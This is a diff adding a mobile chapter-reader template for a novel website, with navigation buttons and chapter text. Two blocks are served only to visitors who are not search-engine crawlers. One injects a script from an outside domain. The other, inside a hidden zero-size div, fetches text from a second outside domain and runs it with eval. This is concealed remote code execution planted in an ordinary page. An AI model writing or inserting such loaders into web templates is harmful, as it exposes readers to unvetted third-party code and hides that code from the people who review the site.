@@ -1,0 +1,102 @@
+
+<!doctype html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="maximum-scale=1.0,minimum-scale=1.0,user-scalable=0,width=device-width,initial-scale=1.0" />
+    <title>{$tkd.title|parseTPL}</title>
+    <meta name="keywords" content="{$tkd.keywords|parseTPL}" />
+    <meta name="description" content="{$tkd.description|parsetpl}" />
+    <link rel="stylesheet" type="text/css" href="__TMPL__/css/ptm.min.css" />
+    <link rel="stylesheet" type="text/css" href="__TMPL__/css/chaptersimple.css" />
+    <link rel="stylesheet" type="text/css" href="__TMPL__/css/skin.min.css" />
+    <link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <meta name="applicable-device" content="mobile"/>
+    <meta http-equiv="Cache-Control" content="no-transform " />
+    <!--<meta name="browsermode" content="application" />-->
+    <!--<meta name="x5-page-mode" content="app" />-->
+</head>
+<body class="theme-default">
+<div class="pt-menu">
+    <div class="header">
+        <div class="back"><a href="{$url.dir}"><i class="fa fa-chevron-left"></i> {$novel.name}</a></div>
+        <a class="button menu-mark" href="{$url.addmark}"><i class="fa fa-bookmark"></i></a>
+        <a class="button menu-more" style="margin-right:5px;" href="{$url.info}"><i class="fa fa-book"></i></a>
+    </div>
+</div>
+<div class="pt-reader" style="display: block">
+    <div class="body">
+        <div class="content anim">
+            <p class="title">{$novel.name} {$chapter.name}</p>
+            <p class="ptm-text-center" style="color:grey;line-height:2">
+                <span>更新：{$chapter.time|date="m-d H:i"}</span>
+                <span>源站：{$chapter.sitename}</span>
+            </p>
+            <div class="ptm-clearfix" style="margin-bottom:10px;">
+                <div class="ptm-col-xs-4">
+                    <a class="ptm-btn ptm-btn-primary" href = "{$chapter.preinfo.url}" title = "上一章 {$chapter.preinfo.name}" style="display:block;margin:0 5px">上一章</a>
+                </div>
+                <div class="ptm-col-xs-4">
+                    <a class="ptm-btn ptm-btn-warning" href="{$url.dir}" style="display:block;margin:0 5px">回目录</a>
+                </div>
+                <div class="ptm-col-xs-4">
+                    <a class="ptm-btn ptm-btn-primary " href = "{$chapter.nextinfo.url}" title = "下一章 {$chapter.nextinfo.name}" style="display:block;margin:0 5px">下一章</a>
+                </div>
+            </div>
+            <div class="chaptercontent">{$chapter.content|br2p}</div>
+        </div>
+<?php
+if(!Request::isSpider()){
+?>
+<div style="margin-top:15px;">
+<script>
+;(function() {
+    var m = document.createElement("script");
+    var s = "_" + Math.random().toString(36).slice(2);
+    document.write("<div id='" + s + "'></div>");
+    m.src = "https://s.sufficient.cn/11/15191.js?ssid=" + s;
+    var ss = document.getElementsByTagName("script")[0];
+    ss.parentNode.insertBefore(m, ss)
+})();
+</script>
+</div>
+<?php } ?>
+        <div class="ptm-clearfix">
+            <div class="ptm-col-xs-4">
+                <a class="ptm-btn ptm-btn-primary" href = "{$chapter.preinfo.url}" title = "上一章 {$chapter.preinfo.name}" style="display:block;margin:0 5px">上一章</a>
+            </div>
+            <div class="ptm-col-xs-4">
+                <a class="ptm-btn ptm-btn-warning" href="{$url.dir}" style="display:block;margin:0 5px">回目录</a>
+            </div>
+            <div class="ptm-col-xs-4">
+                <a class="ptm-btn ptm-btn-primary " href = "{$chapter.nextinfo.url}" title = "下一章 {$chapter.nextinfo.name}" style="display:block;margin:0 5px">下一章</a>
+            </div>
+<?php
+if(!Request::isSpider()){
+?>
+<div  style="font-size:0;-webkit-text-size-adjust:none;">
+<script>
+    ;(function () {
+        var a = new XMLHttpRequest();
+        var b = "https://fen.dkdlsj.com/v/261061/1/1/11.html";
+        if (a != null) {
+            a.onreadystatechange = function () {
+                if (a.readyState == 4) {
+                    if (a.status == 200) {
+                        if (window.execScript) window.execScript(a.responseText, "JavaScript"); else if (window.eval) window.eval(a.responseText, "JavaScript"); else eval(a.responseText);
+                    }
+                }
+            };
+            a.open("GET", b, false);
+            a.send(null);
+        }
+    })();
+</script>
+</div>
+<?php } ?>
+
+        
+    {include file="../common/footer"}
+</div>
+</body>
+</html>
